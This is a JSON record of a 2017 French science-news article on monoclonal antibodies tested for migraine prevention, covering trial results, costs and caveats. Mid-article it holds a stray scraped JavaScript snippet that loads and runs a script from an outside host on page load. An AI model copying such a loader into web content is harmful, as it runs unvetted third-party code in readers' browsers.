{"title": "Migraine : de nouveaux médicaments à l'essai", "newspaper": "Futura Sciences", "author": "Marie-Céline Ray", "date_publi": "09/12/2017", "content": "Une nouvelle génération de médicaments, des anticorps monoclonaux, pourrait bientôt arriver sur le marché pour prévenir les migraines. Deux publications scientifiques récentes nous décrivent les résultats d'essais cliniques ; ces derniers ont été financés par les firmes pharmaceutiques qui développent ces molécules. Trois conseils pour en finir avec la migraine                       En France, sept millions de personnes souffrent régulièrement de migraines. Arte et FutureMag sont partis à la rencontre du docteur Valade, ancien chef de service du centre d’urgence des céphalées de l'hôpital Lariboisière à Paris, afin d’avoir quelques conseils.                                       La  migraine  est plus qu'un  mal de tête . Elle s'accompagne d'autres  symptômes  tels que la nausée, la sensibilité à la  lumière  et au bruit, la fatigue. Les traitements actuels utilisent des  triptans , des médicaments souvent efficaces, mais présentant des effets secondaires. De nouveaux médicaments contre la migraine sont en cours d'essai. Il s'agit d' anticorps monoclonaux  visant à empêcher l'action d'un  peptide  connu pour jouer un rôle dans la migraine : le CGRP ( Calcitonin Gene-Related Peptide ).  Les résultats de deux  essais cliniques  sont parus dans la revue  New England Journal of Medicine . Le premier médicament,  erenumab , développé par Novartis et Amgen, a été testé pendant six mois dans un essai comprenant 955 patients. Le médicament se présente sous la forme d'une injection mensuelle. Alors qu'au départ les patients avaient en moyenne huit journées de migraines par mois, ce nombre pouvait être réduit de trois à quatre jours avec le traitement, contre 1,8 seulement avec le  placebo . Erenumab cible le récepteur du CGRP.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Des anticorps monoclonaux en prévention des migraines  L'autre essai clinique concernait le  fremanezumab , développé par Teva Pharmaceutical. Les résultats ont montré que le traitement mensuel réduisait en moyenne de 4,6 jours la  durée  des migraines chaque mois, avec des variations en fonction des patients, sachant qu'au départ ils avaient environ 13 journées de migraine par mois. Le fremanezumab se lie au CGRP et bloque son action. L'utilisation des  anticorps monoclonaux  pour la  prévention  des migraines intéresse aussi la firme Eli Lilly, qui fait des  essais cliniques  avec un autre anticorps  monoclonal  : le galcanezumab.  Le coût de ces nouveaux traitements sera probablement très élevé, au moins 8.000 dollars par an (6.700 euros au cours actuel) d'après  The Verge  ! Enfin, notons que la durée assez courte des essais ne permet pas de connaître les effets à long terme de ces médicaments. Par ailleurs, on pourrait attendre d'un traitement miracle et coûteux qu'il supprime les migraines chez 100 % des patients...  ", "theme": "sante"}